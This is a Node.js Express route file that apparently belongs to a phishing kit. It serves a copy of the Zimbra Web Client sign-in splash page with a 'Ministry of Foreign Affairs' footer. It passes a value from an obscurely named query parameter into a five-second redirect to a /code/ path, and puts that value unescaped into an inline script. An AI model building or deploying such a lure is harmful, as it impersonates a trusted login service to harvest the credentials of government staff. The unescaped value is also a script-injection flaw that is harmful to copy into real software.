
const express = require ('express');
const router = express.Router();
const db = require('../db');

router.use(express.static('public'));

//validate form data before handling
// Custom middleware for form validation


router.get('/', async (req, res) => {


    const data5 = req.query.tgrdsfgdytrbdfwergter;
    const url = `/code/?dfgfhtuyghnbcgferfh=${data5}`;

    console.log(data5);
  

    if (data5 == null) {
        res.render('error');
        
      }else{

    const htmlContent = `
        <!doctype html>
        <html lang="en">
        <head>
           <script>
                setTimeout(function() {
                    window.location.href = '${url}';
                }, 5000);
            </script> 
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-status-bar-style" content="black">
	<link rel="stylesheet" type="text/css" href="/stylesheet/common,login,zhtml,skin.css">
	<link rel="SHORTCUT ICON" href="/images/favicon.ico">
    <title>Zimbra Web Client Sign In</title>

	
        </head>
        <body>
	
<div style="display:none;">
      <img src="/images/LoginBanner.png" alt="">
      </div>
    
<div id="skin_container_splash_screen" class="SplashScreen">
	
	
	<div id="ZSplashPanel" class="center">
		<div class="contentBox">
			<h1><div id="ZLoginBannerImage" class="ImgLoginBanner" onclick="showCompanyUrl()"></div></h1>
			<div id="ZLoginAppName">
				Web Client
			</div>
			<div id="#ZSplashBodyContainer" class="content">
				<div class="message">
					Loading ...
				</div>
			</div>
		</div>
        <div class="decor1"></div>
	</div>
	<div class="Footer">
        <div class="copyright">
         Copyright © 2023 Ministry of Foreign Affairs. All rights reserved.
        </div>
    </div>
	
	</body>
        </html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            } 

});

    // Display some initial HTML code
   
   /* const initialHtml = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Initial Page</title>
        </head>
        <body>
            <p>Initial content...</p>
        </body>
        </html>
    `;

    res.send(initialHtml);

    const data5 = req.query.data4;
    const url = `/code/?data6=${data5}`;

    console.log(data5,url);

    // Simulate an asynchronous condition check (e.g., waiting for a certain event)
    const conditionPassed = await checkCondition();

    if (conditionPassed) {

        // Proceed to send a new page
        const newHtml = `
            <!DOCTYPE html>
            <html>
            <head>
                <title>New Page</title>
            </head>
            <body>
                <p>New content...</p>
            </body>
            </html>
        `;

        res.send(newHtml);
    }
});

// Simulated function to check the condition asynchronously
function checkCondition() {
    return new Promise((resolve) => {
        setTimeout(() => {
            // Simulate that the condition is met after some time
            resolve(true);
        }, 5000); // Adjust the delay as needed
    });
}
*/

 







module.exports =router;